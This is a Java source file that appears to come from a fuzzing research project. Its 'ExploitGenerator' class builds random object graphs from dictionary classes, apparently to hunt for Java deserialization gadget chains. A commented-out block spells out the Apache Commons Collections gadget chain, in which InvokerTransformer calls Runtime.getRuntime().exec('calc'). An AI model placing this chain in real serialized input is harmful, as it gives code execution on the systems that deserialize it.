package edu.berkeley.cs.jqf.examples.GadgetChain;

import com.pholser.junit.quickcheck.generator.GenerationStatus;
import com.pholser.junit.quickcheck.generator.Generator;
import com.pholser.junit.quickcheck.random.SourceOfRandomness;

import java.io.*;
import java.lang.Object;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.*;

import com.pholser.junit.quickcheck.internal.GeometricDistribution;
import edu.berkeley.cs.jqf.examples.common.Dictionary;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections4.comparators.TransformingComparator;
import sun.misc.Unsafe;

/**
 * @author Sicong Cao
 */

public class ExploitGenerator extends Generator<Object> {

    private static final GeometricDistribution geom = new GeometricDistribution();
    private static final double MEAN_ARRAY_DEPTH = 1.2;
    /*    private String gadgetChain;*/
    private final List<Object> dictionary = new ArrayList<>();

    public ExploitGenerator () {
        super(Object.class);
    }

    public void configure(Dictionary dict) throws IOException {
        // Read dictionary words
        try (InputStream in = ClassLoader.getSystemClassLoader().getResourceAsStream(dict.value())) {
            if (in == null) {
                throw new FileNotFoundException("Dictionary file not found: " + dict);
            }

            BufferedReader br = new BufferedReader(new InputStreamReader(in));
            String item;
            while ((item = br.readLine()) != null) {
                dictionary.add(objectInit(item));
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static Object objectInit (String classname) throws Exception {
        Class<?> target_classname = Class.forName(classname);
        Field f = Unsafe.class.getDeclaredField("theUnsafe");
        f.setAccessible(true);
        Unsafe unsafe = (Unsafe) f.get(null);
        return unsafe.allocateInstance(target_classname);
    }

    @Override
    public Object generate(SourceOfRandomness random, GenerationStatus status) {
/*        HashMap hashMap = new HashMap<>();
        hashMap.put("key", "value");
        HashSet hashSet = new HashSet(1);
        hashSet.add("foo");

        Field field_5 = null;
        try {
            field_5 = hashSet.getClass().getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        }
        field_5.setAccessible(true);

        //获取HashSet集合中的map属性的hashmap对象
        HashMap hashset_map = null;
        try {
            hashset_map = (HashMap) field_5.get(hashSet);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }

        //获取HashMap的table属性
        try {
            field_5 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        }
        field_5.setAccessible(true);

        Object[] array = new Object[0];
        try {
            array = (Object[]) field_5.get(hashset_map);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
        Object node = array[1];

        Field keyField = null;
        try {
            keyField = node.getClass().getDeclaredField("key");
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        }
        keyField.setAccessible(true);
        try {
            keyField.set(node, dictionary.get(2));
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }

        for (int idx = 2; idx < dictionary.size() - 1; idx++) {
            if (dictionary.get(idx).getClass().getName().equals("org.apache.commons.collections.map.LazyMap")) {
                Field extend_field = null;
                try {
                    extend_field = dictionary.get(idx).getClass().getSuperclass().getDeclaredField("map");
                } catch (NoSuchFieldException e) {
                    e.printStackTrace();
                }
                extend_field.setAccessible(true);
                try {
                    extend_field.set(dictionary.get(idx), hashMap);
                } catch (IllegalAccessException e) {
                    e.printStackTrace();
                }
            }


            Field[] target_field = dictionary.get(idx).getClass().getDeclaredFields();//获取所有属性
            for (Field field : target_field) {
                field.setAccessible(true);
                if (field.getType().equals(int.class)) {
                    try {
                        field.set(dictionary.get(idx), random.nextInt(0, 5));
                    } catch (IllegalAccessException e) {
                        //e.printStackTrace();
                    }
                }
                if (field.getName().equals("map") && dictionary.get(idx).getClass().getName().endsWith("TiedMapEntry")) {
                    try {
                        field.set(dictionary.get(idx), dictionary.get(idx+1));
                    } catch (IllegalAccessException e) {
                        e.printStackTrace();
                    }
                }
                if (field.getName().equals("key")) {
                    try {
                        field.set(dictionary.get(idx), "foo");
                    } catch (IllegalAccessException e) {
                        e.printStackTrace();
                    }
                }
                if (field.getName().equals("factory")) {
                    try {
                        field.set(dictionary.get(idx), dictionary.get(idx+1));
                        Field[] fi1 = dictionary.get(idx).getClass().getDeclaredFields();//获取所有属性
                        for (Field fi : fi1) {
                            fi.setAccessible(true);
                            if (fi.getName().equals("iTransformers")) {
                                Transformer[] transformers = new Transformer[]{
                                        new ConstantTransformer(Runtime.class),
                                        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                                        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                                        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),
                                };
                                fi.set(dictionary.get(idx+1), transformers);
                            }
                        }
                    } catch (IllegalAccessException e) {
                        e.printStackTrace();
                    }
                }
            }
        }*/

        for (int idx = 0; idx < dictionary.size() - 1; idx++) {
            Field[] target_field = dictionary.get(idx).getClass().getDeclaredFields();//获取所有属性
            for (Field field : target_field) {
                field.setAccessible(true);
/*                if (Modifier.isFinal(field.getModifiers())) {
                    if (field.getType().isAssignableFrom(dictionary.get(idx + 1).getClass())) {
                        try {
                            field.set(dictionary.get(idx), dictionary.get(idx + 1));
                        } catch (IllegalAccessException e) {
                            //e.printStackTrace();
                        }
                    }
                    continue;
                }*/
                if (!Modifier.isStatic(field.getModifiers())) {
                    if (field.getType().isAssignableFrom(dictionary.get(idx + 1).getClass())) {
                        try {
                            field.set(dictionary.get(idx), dictionary.get(idx + 1));
                        } catch (IllegalAccessException e) {
                            //e.printStackTrace();
                        }
                    }
                    if (field.getType().equals(int.class)) {
                        try {
                            field.set(dictionary.get(idx), random.nextInt(0, 5));
                        } catch (IllegalAccessException e) {
                            //e.printStackTrace();
                        }
                    }
                    if (field.getType().isArray()) {
                        int depth = geom.sampleWithMean(MEAN_ARRAY_DEPTH, random);
                        if (field.getType().getName().substring(2, field.getType().getName().length() - 1).equals("java.lang.Object")) {
                            Object[] objects = new Object[depth];
                            for (int i = 0; i < depth; i++) {
                                //int choice = random.nextInt(dictionary.size());
                                try {
                                    objects[i] = dictionary.get(random.nextInt(dictionary.size()));
                                } catch (Exception e) {
                                    //e.printStackTrace();
                                }
                            }
                            try {
                                field.set(dictionary.get(idx), objects);
                            } catch (IllegalAccessException e) {
                                //e.printStackTrace();
                            }
                        }
                    }
                }
/*                if (java.util.Map.class.isAssignableFrom(field.getType())) {
                    try {
                        field.set(dictionary.get(idx), hashMap);
                    } catch (IllegalAccessException e) {
                        e.printStackTrace();
                    }
                }
                if (java.util.Set.class.isAssignableFrom(field.getType())) {
                    try {
                        field.set(dictionary.get(idx), hashSet);
                    } catch (IllegalAccessException e) {
                        e.printStackTrace();
                    }
                }*/
/*                if (field.getType().equals(int.class)) {
                    try {
                        field.set(dictionary.get(idx), random.nextInt(0, 5));
                    } catch (IllegalAccessException e) {
                        e.printStackTrace();
                    }
                }*/
/*                if (field.getType().isArray()) {
                    int depth = geom.sampleWithMean(MEAN_ARRAY_DEPTH, random);
                    if (field.getType().getName().substring(2, field.getType().getName().length() - 1).equals("java.lang.Object")) {
                        Object[] objects = new Object[depth];
                        for (int i = 0; i < depth; i++) {
                            //int choice = random.nextInt(dictionary.size());
                            try {
                                objects[i] = dictionary.get(random.nextInt(dictionary.size()));
                            } catch (Exception e) {
                                //e.printStackTrace();
                            }
                        }
                        try {
                            field.set(dictionary.get(idx), objects);
                        } catch (IllegalAccessException e) {
                            //e.printStackTrace();
                        }
                    } else {
                        Class<?> c = null;
                        try {
                            c = Class.forName(field.getType().getName().substring(2, field.getType().getName().length() - 1));
                        } catch (ClassNotFoundException e) {
                            e.printStackTrace();
                        }
                        Object[] objects = (Object[]) Array.newInstance(c, depth);
                        for (int i = 0; i < depth; i++) {
                            try {
                                Array.set(objects, i, objectInit(c.getName()));
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                            Field[] subClass_Field = objects[i].getClass().getDeclaredFields();
                            for (Field sub_field : subClass_Field) {
                                sub_field.setAccessible(true);
                                if (sub_field.getType().isAssignableFrom(dictionary.get(random.nextInt(dictionary.size())).getClass())) {
                                    try {
                                        sub_field.set(objects[i], dictionary.get(random.nextInt(dictionary.size())));
                                    } catch (IllegalAccessException e) {
                                        //e.printStackTrace();
                                    }
                                }
                            }
                        }
                        try {
                            field.set(dictionary.get(idx), objects);
                        } catch (IllegalAccessException e) {
                            //e.printStackTrace();
                        }
                    }
                }*/
            }
        }

        return dictionary.get(0);
        //return hashSet;

    }
}
